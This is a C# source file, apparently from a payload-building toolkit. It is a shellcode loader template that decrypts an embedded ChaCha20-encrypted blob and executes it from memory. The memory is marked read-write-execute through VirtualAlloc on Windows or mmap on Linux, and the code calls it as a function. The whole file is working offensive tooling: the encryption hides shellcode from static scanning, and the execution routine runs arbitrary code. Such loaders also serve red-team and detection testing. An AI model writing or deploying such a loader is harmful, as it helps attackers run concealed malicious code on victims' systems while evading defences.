/*
 * chacha20_loader.cs - ChaCha20 shellcode loader template (C#)
 * ============================================================
 * Decrypts an embedded ChaCha20 blob (32 B key, 8 B nonce, length-
 * preserving stream) and executes it as a function.
 *
 * Build-time parameters (see payloads/chacha20_300b.meta.json):
 *   key   : 000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f (32 B)
 *   nonce : 0001020304050607 (8 B)
 *
 * Regenerate the payload include with the builder:
 *   python3 tools/gen_inc.py chacha20 300 --lang cs --out loaders/csharp/chacha20/payload_inc.cs
 *
 * Compile (mono):
 *   mcs -out:chacha20_loader.exe chacha20_loader.cs payload_inc.cs
 *   mono chacha20_loader.exe
 */
using System;
using System.Runtime.InteropServices;

static class ChaCha20Loader
{
    static readonly byte[] Key = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
    };
    static readonly byte[] Nonce = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07 };

    static uint Rotl(uint x, int n) { return (x << n) | (x >> (32 - n)); }

    /* RFC 8439 quarter-round applied to the 4 state words q[0..3]. */
    static void QuarterRound(uint[] s, int a, int b, int c, int d)
    {
        s[a] += s[b]; s[d] ^= s[a]; s[d] = Rotl(s[d], 16);
        s[c] += s[d]; s[b] ^= s[c]; s[b] = Rotl(s[b], 12);
        s[a] += s[b]; s[d] ^= s[a]; s[d] = Rotl(s[d], 8);
        s[c] += s[d]; s[b] ^= s[c]; s[b] = Rotl(s[b], 7);
    }

    static void ChaCha20Block(ulong ctr, byte[] key, byte[] nonce, byte[] outb)
    {
        uint[] st = new uint[16];
        st[0] = 0x61707865; st[1] = 0x3320646e; st[2] = 0x79622d32; st[3] = 0x6b206574;
        for (int i = 0; i < 8; i++)
            st[4 + i] = (uint)(key[4 * i]) | ((uint)key[4 * i + 1] << 8) |
                        ((uint)key[4 * i + 2] << 16) | ((uint)key[4 * i + 3] << 24);
        st[12] = (uint)(ctr & 0xffffffffu);
        st[13] = (uint)((ctr >> 32) & 0xffffffffu);
        for (int i = 0; i < 2; i++)
            st[14 + i] = (uint)(nonce[4 * i]) | ((uint)nonce[4 * i + 1] << 8) |
                         ((uint)nonce[4 * i + 2] << 16) | ((uint)nonce[4 * i + 3] << 24);

        uint[] ws = (uint[])st.Clone();
        int[,] q = {
            {0, 4, 8, 12}, {1, 5, 9, 13}, {2, 6, 10, 14}, {3, 7, 11, 15},
            {0, 5, 10, 15}, {1, 6, 11, 12}, {2, 7, 8, 13}, {3, 4, 9, 14}
        };
        for (int r = 0; r < 10; r++)
            for (int i = 0; i < 8; i++)
                QuarterRound(ws, q[i, 0], q[i, 1], q[i, 2], q[i, 3]);

        for (int i = 0; i < 16; i++)
        {
            uint v = ws[i] + st[i];
            outb[4 * i]     = (byte)v;
            outb[4 * i + 1] = (byte)(v >> 8);
            outb[4 * i + 2] = (byte)(v >> 16);
            outb[4 * i + 3] = (byte)(v >> 24);
        }
    }

    static byte[] Decrypt(byte[] ct)
    {
        byte[] pt = new byte[ct.Length];
        byte[] ks = new byte[64];
        ulong ctr = 0;
        for (int off = 0; off < ct.Length; off += 64)
        {
            ChaCha20Block(ctr, Key, Nonce, ks);
            ctr++;
            int n = Math.Min(64, ct.Length - off);
            for (int i = 0; i < n; i++)
                pt[off + i] = (byte)(ct[off + i] ^ ks[i]);
        }
        return pt;
    }

    /* ---------------- execution method (shared by all templates) ------- */

    delegate int PayloadFn();

    static bool IsWindows
    {
        get
        {
            PlatformID p = Environment.OSVersion.Platform;
            return p == PlatformID.Win32NT || p == PlatformID.Win32Windows || p == PlatformID.WinCE;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("libc", SetLastError = true)]
    static extern IntPtr mmap(IntPtr addr, UIntPtr length, int prot, int flags, int fd, IntPtr offset);

    [DllImport("libc", SetLastError = true)]
    static extern int munmap(IntPtr addr, UIntPtr length);

    static int Run(byte[] shellcode)
    {
        IntPtr mem;
        if (IsWindows)
        {
            mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                               0x40 /*PAGE_EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero) { Console.WriteLine("[-] VirtualAlloc failed"); return -1; }
        }
        else
        {
            mem = mmap(IntPtr.Zero, (UIntPtr)shellcode.Length,
                       0x7 /*PROT_READ|PROT_WRITE|PROT_EXEC*/,
                       0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, IntPtr.Zero);
            if (mem == new IntPtr(-1)) { Console.WriteLine("[-] mmap failed"); return -1; }
        }
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        int r = ((PayloadFn)Marshal.GetDelegateForFunctionPointer(mem, typeof(PayloadFn)))();
        if (IsWindows)
            VirtualFree(mem, UIntPtr.Zero, 0x8000 /*MEM_RELEASE*/);
        else
            munmap(mem, (UIntPtr)shellcode.Length);
        return r;
    }

    public static void Main()
    {
        byte[] plain = Decrypt(Payload.Data);
        Console.WriteLine("[+] ChaCha20 decrypted " + plain.Length + " bytes");
        int r = Run(plain);
        Console.WriteLine("[+] payload returned " + r);
    }
}
